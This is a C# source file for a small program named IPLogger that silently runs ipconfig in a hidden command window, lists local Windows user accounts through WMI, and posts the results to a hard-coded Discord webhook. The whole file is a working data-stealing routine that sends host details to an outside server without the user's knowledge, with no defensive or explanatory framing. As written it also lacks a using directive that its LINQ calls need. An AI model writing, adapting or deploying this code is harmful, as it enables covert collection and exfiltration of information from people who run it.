using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Management;

class IPLogger {
    static string GetIP() {
        Process process = new Process();

        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        
        process.StartInfo.Arguments = $"/c ipconfig | findstr /i ipv4";

        process.Start();

        string output = process.StandardOutput.ReadToEnd();

        process.WaitForExit();

        return output;
    }
    
    static string GetUsers() {
        var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_UserAccount");

        return string.Join("\n", searcher.Get().Cast<ManagementObject>().Select(i => i["Name"]));
    }

    static async Task Log(string message) {
        string webhook = "https://discord.com/api/webhooks/1348932343188164630/5u9uwWWIzaBBTBIHaRvkkXEfRYE8IrslDJSF9zoWEPRji0Uu03ovWXWaoSfLiqneOlRn";

        using (HttpClient client = new HttpClient()) {
            string payload = JsonConvert.SerializeObject(new { content = message });

            var content = new StringContent(payload, Encoding.UTF8, "application/json");

            var response = await client.PostAsync(webhook, content);

            Console.WriteLine($"Response: {response}");
        }
    }

    static async Task Main(string[] args) {
        try {
            await Log($"```{GetUsers()}``````{GetIP()}```");
        }
        catch (Exception e) {
            Console.WriteLine($"Error: {e}");
        }
    }
}